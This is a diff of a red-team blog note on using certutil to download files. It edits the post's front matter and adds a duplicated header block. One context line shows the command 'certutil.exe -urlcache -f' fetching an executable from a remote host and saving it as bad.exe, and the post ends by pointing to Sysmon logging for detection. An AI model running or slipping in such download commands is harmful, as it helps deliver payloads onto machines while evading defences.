@@ -2,9 +2,18 @@
 layout: post
 title: "downloading file with certutil"
 date: 2024-06-18
+categories: all_md_files
+tags: redteam, mitre killchain, offensivesecurity, cpent, cpts, oscp, exploit
+permalink: /downloading-file-with-certutil/
+---
+
+---
+layout: post
+title: "downloading file with certutil"
+date: 2024-06-18
 categories: defense-evasion
-tags: redteam, mitre, killchain, offensivesecurity, cpent, cpts, oscp, exploit
-permalink: /defense-evasion/
+tags: redteam, mitre killchain, offensivesecurity, cpent, cpts, oscp, exploit
+permalink: /downloading-file-with-certutil/
 ---
 
 ---
@@ -26,4 +35,5 @@ certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
 Sysmon commandling logging is a good place to start for monitoring suspicious `certutil.exe` behaviour:
 
 ![](../../.gitbook/assets/certutil-sysmon.png)
+
 @spotheplanet
